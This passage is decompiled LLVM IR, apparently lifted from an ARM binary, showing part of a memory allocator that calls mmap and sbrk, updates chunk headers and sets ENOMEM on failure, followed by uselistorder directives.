  %v3_12d48 = add i32 %v2_12d48, %v1_12d48
  %v2_12d4c = load i32, i32* @r5, align 4
  %v3_12d4c = add i32 %v3_12d48, %v2_12d4c
  store i32 %v3_12d4c, i32* %r3.global-to-local, align 4
  %v2_12d50 = load i32, i32* %fp.global-to-local, align 4
  %v3_12d50 = and i32 %v2_12d50, %v3_12d4c
  store i32 %v3_12d50, i32* @r5, align 4
  br label %.thread30

.thread30thread-pre-split:                        ; preds = %dec_label_pc_12d34
  %v0_12d54.pr = load i32, i32* @r5, align 4
  br label %.thread30

.thread30:                                        ; preds = %.thread30thread-pre-split, %bb156
  %v0_12d54 = phi i32 [ %v0_12d54.pr, %.thread30thread-pre-split ], [ %v3_12d50, %bb156 ]
  %v2_12d54 = icmp ugt i32 %v0_12d54, 1048575
  br i1 %v2_12d54, label %bb158, label %bb157

bb157:                                            ; preds = %.thread30
  store i32 1048576, i32* @r5, align 4
  br label %bb158

bb158:                                            ; preds = %.thread30, %bb157
  %v0_12d6c = phi i32 [ %v0_12d54, %.thread30 ], [ 1048576, %bb157 ]
  %v1_12d5c = load i32, i32* @sl, align 4
  %tmp215 = icmp ugt i32 %v0_12d6c, %v1_12d5c
  br i1 %tmp215, label %dec_label_pc_12d64, label %dec_label_pc_12fc8

dec_label_pc_12d64:                               ; preds = %bb158
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_12d6c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_12d80 = call i32 @mmap(i32 0, i32 %v0_12d6c, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_12d80, i32* %r0.global-to-local, align 4
  %v3_12d84 = icmp eq i32 %v6_12d80, -1
  %v8_12d84 = icmp eq i32 %v6_12d80, -1
  store i32 %v6_12d80, i32* @r4, align 4
  br i1 %v8_12d84, label %.thread33, label %bb159

bb159:                                            ; preds = %dec_label_pc_12d64
  %v1_12d8c = load i32, i32* %r6.global-to-local, align 4
  %v2_12d8c = add i32 %v1_12d8c, 864
  %v3_12d8c = inttoptr i32 %v2_12d8c to i32*
  %v4_12d8c = load i32, i32* %v3_12d8c, align 4
  %v2_12d90 = load i32, i32* @r5, align 4
  %v3_12d90 = add i32 %v2_12d90, %v6_12d80
  store i32 %v3_12d90, i32* %r0.global-to-local, align 4
  %v2_12d94 = and i32 %v4_12d8c, -2
  store i32 %v2_12d94, i32* %r3.global-to-local, align 4
  store i32 %v2_12d94, i32* %v3_12d8c, align 4
  br label %.thread33

.thread33:                                        ; preds = %dec_label_pc_12d64, %bb159
  br i1 %v3_12d84, label %dec_label_pc_12da0, label %dec_label_pc_12da4

dec_label_pc_12da0:                               ; preds = %.thread33, %dec_label_pc_12d20
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12da4

dec_label_pc_12da4:                               ; preds = %.thread33, %dec_label_pc_12da0
  %v0_12da4 = load i32, i32* @r4, align 4
  %v7_12da4 = icmp eq i32 %v0_12da4, -1
  br i1 %v7_12da4, label %dec_label_pc_12fc8, label %dec_label_pc_12dac

dec_label_pc_12dac:                               ; preds = %dec_label_pc_12da4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r2.global-to-local, align 4
  %v4_12db4 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 32) to i32*), align 4
  store i32 %v4_12db4, i32* %ip.global-to-local, align 4
  store i32 %v3_12ce4, i32* %r2.global-to-local, align 4
  %v1_12dbc = add i32 %v4_12db4, 872
  %v2_12dbc = inttoptr i32 %v1_12dbc to i32*
  %v3_12dbc = load i32, i32* %v2_12dbc, align 4
  %v1_12dc0 = load i32, i32* @r8, align 4
  %v2_12dc0 = add i32 %v1_12dc0, %v3_12ce4
  store i32 %v2_12dc0, i32* %r1.global-to-local, align 4
  %v0_12dc4 = load i32, i32* @r5, align 4
  %v2_12dc4 = add i32 %v0_12dc4, %v3_12dbc
  store i32 %v2_12dc4, i32* %r3.global-to-local, align 4
  %v9_12dc8 = icmp eq i32 %v0_12da4, %v2_12dc0
  br i1 %v9_12dc8, label %bb160, label %.thread123

.thread123:                                       ; preds = %dec_label_pc_12dac
  store i32 %v2_12dc4, i32* %v2_12dbc, align 4
  br label %dec_label_pc_12de4

bb160:                                            ; preds = %dec_label_pc_12dac
  %v1_12dcc = load i32, i32* %r0.global-to-local, align 4
  %v8_12dcc = icmp eq i32 %v1_12dcc, -1
  store i32 %v2_12dc4, i32* %v2_12dbc, align 4
  br i1 %v8_12dcc, label %.thread35, label %dec_label_pc_12de4

.thread35:                                        ; preds = %bb160
  %v1_12dd4 = load i32, i32* @r5, align 4
  %v2_12dd4 = load i32, i32* @r8, align 4
  %v3_12dd4 = add i32 %v2_12dd4, %v1_12dd4
  %v2_12dd8 = or i32 %v3_12dd4, 1
  store i32 %v2_12dd8, i32* %r3.global-to-local, align 4
  %v2_12ddc = load i32, i32* %r2.global-to-local, align 4
  %v3_12ddc = add i32 %v2_12ddc, 4
  %v4_12ddc = inttoptr i32 %v3_12ddc to i32*
  store i32 %v2_12dd8, i32* %v4_12ddc, align 4
  br label %dec_label_pc_12f5c

dec_label_pc_12de4:                               ; preds = %bb160, %.thread123
  %v0_12de8.pr = load i32, i32* @r8, align 4
  %v0_12de4 = load i32, i32* %ip.global-to-local, align 4
  %v1_12de4 = add i32 %v0_12de4, 864
  %v2_12de4 = inttoptr i32 %v1_12de4 to i32*
  %v3_12de4 = load i32, i32* %v2_12de4, align 4
  store i32 %v3_12de4, i32* %r2.global-to-local, align 4
  %v2_12de8 = icmp eq i32 %v0_12de8.pr, 0
  br i1 %v2_12de8, label %.thread38, label %.thread37

.thread38:                                        ; preds = %dec_label_pc_12de4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread41

.thread37:                                        ; preds = %dec_label_pc_12de4
  %v2_12df0 = urem i32 %v3_12de4, 2
  store i32 %v2_12df0, i32* %r3.global-to-local, align 4
  %v2_12df4 = icmp eq i32 %v2_12df0, 0
  br i1 %v2_12df4, label %.thread41, label %dec_label_pc_12dfc

dec_label_pc_12dfc:                               ; preds = %.thread37
  %v0_12dfc = load i32, i32* @r4, align 4
  %v1_12dfc = load i32, i32* %r1.global-to-local, align 4
  %v3_12dfc = icmp ult i32 %v0_12dfc, %v1_12dfc
  br i1 %v3_12dfc, label %bb161, label %.thread41

bb161:                                            ; preds = %dec_label_pc_12dfc
  %v2_12e00 = and i32 %v3_12de4, -2
  store i32 %v2_12e00, i32* %r3.global-to-local, align 4
  store i32 %v2_12e00, i32* %v2_12de4, align 4
  br label %.thread41

.thread41:                                        ; preds = %dec_label_pc_12dfc, %.thread38, %.thread37, %bb161
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %ip.global-to-local, align 4
  %v4_12e10 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 32) to i32*), align 4
  store i32 %v4_12e10, i32* @r7, align 4
  %v1_12e14 = add i32 %v4_12e10, 864
  %v2_12e14 = inttoptr i32 %v1_12e14 to i32*
  %v3_12e14 = load i32, i32* %v2_12e14, align 4
  store i32 %v3_12e14, i32* %r3.global-to-local, align 4
  %v1_12e18 = urem i32 %v3_12e14, 2
  store i32 %v1_12e18, i32* @r6, align 4
  %v2_12e18 = icmp eq i32 %v1_12e18, 0
  br i1 %v2_12e18, label %dec_label_pc_12eac, label %dec_label_pc_12e20

dec_label_pc_12e20:                               ; preds = %.thread41
  %v0_12e20 = load i32, i32* @r8, align 4
  %v2_12e20 = icmp eq i32 %v0_12e20, 0
  br i1 %v2_12e20, label %.thread44, label %bb162

bb162:                                            ; preds = %dec_label_pc_12e20
  %v2_12e24 = add i32 %v4_12e10, 872
  %v3_12e24 = inttoptr i32 %v2_12e24 to i32*
  %v4_12e24 = load i32, i32* %v3_12e24, align 4
  store i32 %v4_12e24, i32* %r2.global-to-local, align 4
  %v1_12e28 = load i32, i32* %r1.global-to-local, align 4
  %v2_12e28 = load i32, i32* @r4, align 4
  %v3_12e28 = sub i32 %v2_12e28, %v1_12e28
  %v3_12e2c = add i32 %v3_12e28, %v4_12e24
  store i32 %v3_12e2c, i32* %r3.global-to-local, align 4
  store i32 %v3_12e2c, i32* %v3_12e24, align 4
  br label %.thread44

.thread44:                                        ; preds = %dec_label_pc_12e20, %bb162
  %v0_12e34 = load i32, i32* @r4, align 4
  %v1_12e34 = urem i32 %v0_12e34, 8
  store i32 %v1_12e34, i32* %r3.global-to-local, align 4
  %v2_12e34 = icmp eq i32 %v1_12e34, 0
  br i1 %v2_12e34, label %.thread45, label %bb163

bb163:                                            ; preds = %.thread44
  %v2_12e38 = sub nsw i32 8, %v1_12e34
  store i32 %v2_12e38, i32* %r3.global-to-local, align 4
  %v3_12e3c = add i32 %v2_12e38, %v0_12e34
  store i32 %v3_12e3c, i32* @r7, align 4
  br label %.thread45

.thread45:                                        ; preds = %.thread44, %bb163
  %v0_12e44 = phi i32 [ 0, %.thread44 ], [ %v2_12e38, %bb163 ]
  %v1_12e40 = load i32, i32* @r5, align 4
  %v2_12e40 = add i32 %v1_12e40, %v0_12e34
  store i32 %v2_12e40, i32* @r6, align 4
  %v1_12e44 = load i32, i32* @r8, align 4
  %v2_12e44 = add i32 %v2_12e40, %v0_12e44
  %v2_12e48 = add i32 %v2_12e44, %v1_12e44
  store i32 %v2_12e48, i32* %r1.global-to-local, align 4
  %v1_12e4c = load i32, i32* %sb.global-to-local, align 4
  %v2_12e4c = add i32 %v1_12e4c, %v2_12e48
  %v1_12e50 = load i32, i32* %fp.global-to-local, align 4
  %v2_12e50 = and i32 %v1_12e50, %v2_12e4c
  store i32 %v2_12e50, i32* %r2.global-to-local, align 4
  %v2_12e54 = sub i32 0, %v2_12e40
  store i32 %v2_12e54, i32* %r3.global-to-local, align 4
  %v2_12e58 = sub i32 %v2_12e50, %v2_12e40
  store i32 %v2_12e58, i32* @r5, align 4
  store i32 %v2_12e58, i32* %r0.global-to-local, align 4
  br i1 %v2_12e34, label %bb164, label %bb165

bb164:                                            ; preds = %.thread45
  store i32 %v0_12e34, i32* @r7, align 4
  br label %bb165

bb165:                                            ; preds = %.thread45, %bb164
  %v1_12e64 = call i32 @__GI_sbrk(i32 %v2_12e58)
  store i32 %v1_12e64, i32* %r0.global-to-local, align 4
  %v3_12e68 = icmp eq i32 %v1_12e64, -1
  br i1 %v3_12e68, label %dec_label_pc_12e70, label %dec_label_pc_12e80

dec_label_pc_12e70:                               ; preds = %bb165
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12e74 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12e74, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12ed8

dec_label_pc_12e80:                               ; preds = %bb165
  %v1_12e80 = load i32, i32* @r4, align 4
  %v3_12e80 = icmp ult i32 %v1_12e64, %v1_12e80
  br i1 %v3_12e80, label %dec_label_pc_12e88, label %dec_label_pc_12ed8

dec_label_pc_12e88:                               ; preds = %dec_label_pc_12e80
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r0.global-to-local, align 4
  %v4_12e90 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 32) to i32*), align 4
  store i32 %v4_12e90, i32* %r2.global-to-local, align 4
  %v1_12e94 = add i32 %v4_12e90, 864
  %v2_12e94 = inttoptr i32 %v1_12e94 to i32*
  %v3_12e94 = load i32, i32* %v2_12e94, align 4
  %v0_12e98 = load i32, i32* @r6, align 4
  store i32 %v0_12e98, i32* %r0.global-to-local, align 4
  %v1_12e9c = and i32 %v3_12e94, -2
  store i32 %v1_12e9c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_12e9c, i32* %v2_12e94, align 4
  br label %dec_label_pc_12ed8

dec_label_pc_12eac:                               ; preds = %.thread41
  %v0_12eac = load i32, i32* %r0.global-to-local, align 4
  %v3_12eac = icmp eq i32 %v0_12eac, -1
  br i1 %v3_12eac, label %dec_label_pc_12eb4, label %dec_label_pc_12ed0

dec_label_pc_12eb4:                               ; preds = %dec_label_pc_12eac
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12eb8 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12eb8, i32* %r0.global-to-local, align 4
  %v0_12ebc = load i32, i32* @r7, align 4
  %v1_12ebc = add i32 %v0_12ebc, 872
  %v2_12ebc = inttoptr i32 %v1_12ebc to i32*
  %v3_12ebc = load i32, i32* %v2_12ebc, align 4
  store i32 %v3_12ebc, i32* %r2.global-to-local, align 4
  %v0_12ec0 = load i32, i32* @r4, align 4
  %v0_12ec4 = load i32, i32* @r5, align 4
  %v2_12ec0 = add i32 %v3_12ebc, %v1_12eb8
  %v2_12ec4 = sub i32 %v2_12ec0, %v0_12ec0
  %v2_12ec8 = sub i32 %v2_12ec4, %v0_12ec4
  store i32 %v2_12ec8, i32* %r3.global-to-local, align 4
  store i32 %v2_12ec8, i32* %v2_12ebc, align 4
  %v0_12ed4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12ed0

dec_label_pc_12ed0:                               ; preds = %dec_label_pc_12eac, %dec_label_pc_12eb4
  %v0_12ed4 = phi i32 [ 0, %dec_label_pc_12eac ], [ %v0_12ed4.pre, %dec_label_pc_12eb4 ]
  %v0_12ed0 = load i32, i32* @r4, align 4
  store i32 %v0_12ed0, i32* @r7, align 4
  store i32 %v0_12ed4, i32* @r5, align 4
  br label %dec_label_pc_12ed8

dec_label_pc_12ed8:                               ; preds = %dec_label_pc_12e80, %dec_label_pc_12e88, %dec_label_pc_12e70, %dec_label_pc_12ed0
  %v0_12ed8 = load i32, i32* %r0.global-to-local, align 4
  %v7_12ed8 = icmp eq i32 %v0_12ed8, -1
  br i1 %v7_12ed8, label %dec_label_pc_12f5c, label %dec_label_pc_12ee0

dec_label_pc_12ee0:                               ; preds = %dec_label_pc_12ed8
  %v1_12ee0 = load i32, i32* @r5, align 4
  %v2_12ee0 = add i32 %v1_12ee0, %v0_12ed8
  %v0_12ee4 = load i32, i32* @r7, align 4
  %v2_12ee4 = sub i32 %v2_12ee0, %v0_12ee4
  %v1_12ee8 = or i32 %v2_12ee4, 1
  %v2_12eec = add i32 %v0_12ee4, 4
  %v3_12eec = inttoptr i32 %v2_12eec to i32*
  store i32 %v1_12ee8, i32* %v3_12eec, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r1.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_12ef8 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 32) to i32*), align 4
  store i32 %v4_12ef8, i32* @r6, align 4
  %v1_12efc = add i32 %v4_12ef8, 872
  %v2_12efc = inttoptr i32 %v1_12efc to i32*
  %v3_12efc = load i32, i32* %v2_12efc, align 4
  %v0_12f00 = load i32, i32* @r8, align 4
  %v2_12f00 = icmp eq i32 %v0_12f00, 0
  %v0_12f04 = load i32, i32* @r5, align 4
  %v2_12f04 = add i32 %v0_12f04, %v3_12efc
  store i32 %v2_12f04, i32* %r3.global-to-local, align 4
  store i32 %v2_12f04, i32* %v2_12efc, align 4
  %v0_12f0c = load i32, i32* @r7, align 4
  %v1_12f0c = load i32, i32* @r6, align 4
  %v2_12f0c = add i32 %v1_12f0c, 44
  %v3_12f0c = inttoptr i32 %v2_12f0c to i32*
  store i32 %v0_12f0c, i32* %v3_12f0c, align 4
  br i1 %v2_12f00, label %dec_label_pc_12f5c, label %dec_label_pc_12f14

dec_label_pc_12f14:                               ; preds = %dec_label_pc_12ee0
  %v0_12f18 = load i32, i32* @r8, align 4
  %v1_12f18 = add i32 %v0_12f18, -12
  %v1_12f1c = and i32 %v1_12f18, -8
  store i32 %v3_12ce4, i32* %ip.global-to-local, align 4
  %v2_12f24 = add i32 %v1_12f1c, %v3_12ce4
  store i32 %v2_12f24, i32* %r1.global-to-local, align 4
  %v2_12f28 = icmp ugt i32 %v1_12f1c, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_12f30 = or i32 %v1_12f1c, 1
  store i32 %v1_12f30, i32* %r3.global-to-local, align 4
  store i32 %v1_12f30, i32* %v2_12cf0, align 4
  %v0_12f38 = load i32, i32* %r2.global-to-local, align 4
  %v1_12f38 = load i32, i32* %r1.global-to-local, align 4
  %v2_12f38 = add i32 %v1_12f38, 8
  %v3_12f38 = inttoptr i32 %v2_12f38 to i32*
  store i32 %v0_12f38, i32* %v3_12f38, align 4
  %v0_12f3c = load i32, i32* %r2.global-to-local, align 4
  %v1_12f3c = load i32, i32* %r1.global-to-local, align 4
  %v2_12f3c = add i32 %v1_12f3c, 4
  %v3_12f3c = inttoptr i32 %v2_12f3c to i32*
  store i32 %v0_12f3c, i32* %v3_12f3c, align 4
  br i1 %v2_12f28, label %dec_label_pc_12f44, label %dec_label_pc_12f5c

dec_label_pc_12f44:                               ; preds = %dec_label_pc_12f14
  %v0_12f44 = load i32, i32* @r6, align 4
  %v1_12f44 = add i32 %v0_12f44, 836
  %v2_12f44 = inttoptr i32 %v1_12f44 to i32*
  %v3_12f44 = load i32, i32* %v2_12f44, align 4
  store i32 %v3_12f44, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_12f4c = load i32, i32* %ip.global-to-local, align 4
  %v1_12f4c = add i32 %v0_12f4c, 8
  store i32 %v1_12f4c, i32* @r0, align 4
  store i32 -1, i32* %v2_12f44, align 4
  %v0_12f54 = call i32 @free()
  store i32 %v0_12f54, i32* %r0.global-to-local, align 4
  %v0_12f58 = load i32, i32* @r4, align 4
  %v1_12f58 = load i32, i32* @r6, align 4
  %v2_12f58 = add i32 %v1_12f58, 836
  %v3_12f58 = inttoptr i32 %v2_12f58 to i32*
  store i32 %v0_12f58, i32* %v3_12f58, align 4
  br label %dec_label_pc_12f5c

dec_label_pc_12f5c:                               ; preds = %.thread35, %dec_label_pc_12f14, %dec_label_pc_12ee0, %dec_label_pc_12ed8, %dec_label_pc_12f44
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r0.global-to-local, align 4
  %v4_12f64 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 32) to i32*), align 4
  store i32 %v4_12f64, i32* %lr.global-to-local, align 4
  %v1_12f68 = add i32 %v4_12f64, 872
  store i32 %v1_12f68, i32* %r1.global-to-local, align 4
  %v1_12f6c = inttoptr i32 %v1_12f68 to i32*
  %v2_12f6c = load i32, i32* %v1_12f6c, align 4
  store i32 %v2_12f6c, i32* %r1.global-to-local, align 4
  %v3_12f6c = add i32 %v4_12f64, 876
  %v4_12f6c = inttoptr i32 %v3_12f6c to i32*
  %v5_12f6c = load i32, i32* %v4_12f6c, align 4
  store i32 %v5_12f6c, i32* %r3.global-to-local, align 4
  %v1_12f74 = add i32 %v4_12f64, 868
  %v2_12f74 = inttoptr i32 %v1_12f74 to i32*
  %v3_12f74 = load i32, i32* %v2_12f74, align 4
  store i32 %v3_12f74, i32* %r3.global-to-local, align 4
  %v1_12f78 = add i32 %v4_12f64, 884
  %v2_12f78 = inttoptr i32 %v1_12f78 to i32*
  %v3_12f78 = load i32, i32* %v2_12f78, align 4
  store i32 %v3_12f78, i32* %r2.global-to-local, align 4
  %v2_12f7c = add i32 %v3_12f74, %v2_12f6c
  store i32 %v2_12f7c, i32* %r3.global-to-local, align 4
  %tmp216 = icmp ugt i32 %v2_12f6c, %v5_12f6c
  br i1 %tmp216, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_12f5c
  store i32 %v2_12f6c, i32* %v4_12f6c, align 4
  %v0_12f84.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_12f84.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_12f5c, %bb166
  %v1_12f84 = phi i32 [ %v3_12f78, %dec_label_pc_12f5c ], [ %v1_12f84.pre, %bb166 ]
  %v4_12f88 = phi i32 [ %v2_12f7c, %dec_label_pc_12f5c ], [ %v0_12f84.pre, %bb166 ]
  %tmp217 = icmp ugt i32 %v4_12f88, %v1_12f84
  br i1 %tmp217, label %bb168, label %bb169

bb168:                                            ; preds = %bb167
  %v5_12f88 = load i32, i32* %lr.global-to-local, align 4
  %v6_12f88 = add i32 %v5_12f88, 884
  %v7_12f88 = inttoptr i32 %v6_12f88 to i32*
  store i32 %v4_12f88, i32* %v7_12f88, align 4
  br label %bb169

bb169:                                            ; preds = %bb167, %bb168
  %v0_12f8c = load i32, i32* %lr.global-to-local, align 4
  %v1_12f8c = add i32 %v0_12f8c, 44
  %v2_12f8c = inttoptr i32 %v1_12f8c to i32*
  %v3_12f8c = load i32, i32* %v2_12f8c, align 4
  store i32 %v3_12f8c, i32* %ip.global-to-local, align 4
  %v1_12f90 = add i32 %v3_12f8c, 4
  %v2_12f90 = inttoptr i32 %v1_12f90 to i32*
  %v3_12f90 = load i32, i32* %v2_12f90, align 4
  store i32 %v1_12ba4, i32* %r1.global-to-local, align 4
  %v1_12f98 = and i32 %v3_12f90, -4
  store i32 %v1_12f98, i32* %r3.global-to-local, align 4
  %v3_12f9c = icmp ult i32 %v1_12f98, %v1_12ba4
  br i1 %v3_12f9c, label %dec_label_pc_12fc8, label %dec_label_pc_12fa4

dec_label_pc_12fa4:                               ; preds = %bb169
  %v0_12fa4 = load i32, i32* @sl, align 4
  %v2_12fa4 = sub i32 %v1_12f98, %v0_12fa4
  %v2_12fa8 = add i32 %v0_12fa4, %v3_12f8c
  store i32 %v2_12fa8, i32* %r1.global-to-local, align 4
  %v1_12fac = or i32 %v2_12fa4, 1
  store i32 %v1_12fac, i32* %r3.global-to-local, align 4
  %v1_12fb0 = or i32 %v0_12fa4, 1
  store i32 %v1_12fb0, i32* %r2.global-to-local, align 4
  %v1_12fb4 = add i32 %v3_12f8c, 8
  store i32 %v1_12fb4, i32* %r0.global-to-local, align 4
  store i32 %v1_12fb0, i32* %v2_12f90, align 4
  %v0_12fbc = load i32, i32* %r1.global-to-local, align 4
  %v1_12fbc = load i32, i32* %lr.global-to-local, align 4
  %v2_12fbc = add i32 %v1_12fbc, 44
  %v3_12fbc = inttoptr i32 %v2_12fbc to i32*
  store i32 %v0_12fbc, i32* %v3_12fbc, align 4
  %v0_12fc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_12fc0 = load i32, i32* %r1.global-to-local, align 4
  %v2_12fc0 = add i32 %v1_12fc0, 4
  %v3_12fc0 = inttoptr i32 %v2_12fc0 to i32*
  store i32 %v0_12fc0, i32* %v3_12fc0, align 4
  br label %dec_label_pc_12fd8

dec_label_pc_12fc8:                               ; preds = %bb158, %bb169, %dec_label_pc_12da4
  %v0_12fc8 = call i32 @__GI___errno_location()
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_12fd0 = inttoptr i32 %v0_12fc8 to i32*
  store i32 12, i32* %v2_12fd0, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12fd8

dec_label_pc_12fd8:                               ; preds = %bb152, %bb151, %dec_label_pc_12fa4, %dec_label_pc_12bec, %dec_label_pc_12fc8
  %v0_12fd8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12fd8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12fdc

dec_label_pc_12fdc:                               ; preds = %.thread2, %dec_label_pc_12bb8, %.thread122, %dec_label_pc_12a28, %dec_label_pc_12a1c, %dec_label_pc_12884, %dec_label_pc_12808, %dec_label_pc_12fd8
  store i32 %v2_12730, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* @r3, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r2.global-to-local, align 4
  %v4_12fec = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 24) to i32*), align 4
  store i32 %v4_12fec, i32* @ip, align 4
  store i32 77816, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12fec)
  br label %dec_label_pc_12ff8

dec_label_pc_12ff8:                               ; preds = %dec_label_pc_12768, %dec_label_pc_12fdc
  %v0_12ff8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12ff8, i32* %r0.global-to-local, align 4
  store i32 %v3_12704, i32* @r4, align 4
  store i32 %v6_12704, i32* @r5, align 4
  store i32 %v9_12704, i32* @r6, align 4
  store i32 %v12_12704, i32* @r7, align 4
  store i32 %v15_12704, i32* @r8, align 4
  store i32 %v18_12704, i32* @sb, align 4
  store i32 %v21_12704, i32* @sl, align 4
  store i32 %v24_12704, i32* @fp, align 4
  store i32 %v27_12704, i32* @lr, align 4
  ret i32 %v0_12ff8

; uselistorder directives
  uselistorder i32 %v0_12fa4, { 1, 0, 2 }
  uselistorder i32 %v3_12f8c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12f88, { 1, 0 }
  uselistorder i32 %v2_12f6c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_12f64, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_12f1c, { 1, 2, 0 }
  uselistorder i32 %v0_12ee4, { 1, 0 }
  uselistorder i32 %v0_12ed8, { 1, 0 }
  uselistorder i32 %v2_12ec8, { 1, 0 }
  uselistorder i32 %v2_12e58, { 2, 1, 0 }
  uselistorder i32 %v2_12e40, { 1, 2, 0, 3 }
  uselistorder i32 %v2_12e38, { 1, 0, 2 }
  uselistorder i32 %v1_12e34, { 2, 1, 0 }
  uselistorder i32 %v0_12e34, { 3, 1, 2, 0 }
  uselistorder i32 %v1_12e18, { 1, 0 }
  uselistorder i32 %v2_12df0, { 1, 0 }
  uselistorder i32 %v3_12de4, { 1, 0, 2 }
  uselistorder i32 %v2_12dc4, { 1, 0, 2 }
  uselistorder i32* %v2_12dbc, { 1, 0, 2 }
  uselistorder i32 %v0_12da4, { 1, 0 }
  uselistorder i32 %v6_12d80, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12d6c, { 2, 1, 0 }
  uselistorder i32 %v0_12d54, { 1, 0 }
  uselistorder i32 %v2_12d10, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12d0c, { 1, 0 }
  uselistorder i32 %v3_12ce4, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_12cc4, { 1, 0, 2 }
  uselistorder i32 %v2_12cac, { 1, 2, 0, 3 }
  uselistorder i32 %v1_12c54, { 2, 1, 0 }
  uselistorder i32 %v6_12c48, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_12c24, { 2, 1, 0, 3 }
  uselistorder i32 %v3_12be4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12ba4, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_12b9c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12b98, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_12b84, { 1, 0 }
  uselistorder i32 %v7_12b44, { 1, 0 }
  uselistorder i32 %v4_12b44, { 1, 0 }
  uselistorder i32 %v0_12b14, { 1, 0 }
  uselistorder i32 %v2_12ae8, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_12ae455, { 1, 0 }
  uselistorder i32 %v1_12ab0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_12a98., { 1, 2, 0 }
  uselistorder i32 %v0_12aa0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_12aa0, { 1, 0 }
  uselistorder i32 %v3_12a80, { 1, 0 }
  uselistorder i32 %v4_12a7c, { 1, 0, 2 }
  uselistorder i32 %v1_129ec, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12a44, { 1, 0 }
  uselistorder i32 %v1_12a28, { 1, 0 }
  uselistorder i32 %v1_128c8, { 1, 0 }
  uselistorder i32 %v0_12a08, { 2, 0, 1, 3 }
  uselistorder i32 %v3_129d0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_12a64.pre, { 1, 2, 0 }
  uselistorder i32 %v0_129ac, { 2, 1, 0 }
  uselistorder i32 %v3_129a0, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_128c0, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_12968, { 1, 0 }
  uselistorder i32 %v3_1295c, { 1, 0 }
  uselistorder i32 %v0_12968, { 1, 0 }
  uselistorder i32 %v3_12940, { 0, 2, 3, 1 }
  uselistorder i32 %v2_12930, { 1, 0, 2 }
  uselistorder i32 %v3_128e8, { 2, 1, 0 }
  uselistorder i32 %v0_128d8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_128a8, { 1, 0 }
  uselistorder i32 %v1_1285c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_12858, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_127fc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_127f0, { 1, 0 }
  uselistorder i32 %v3_127c0, { 1, 0 }
  uselistorder i32 %v0_127b4, { 5, 6, 4, 2, 0, 3, 1 }
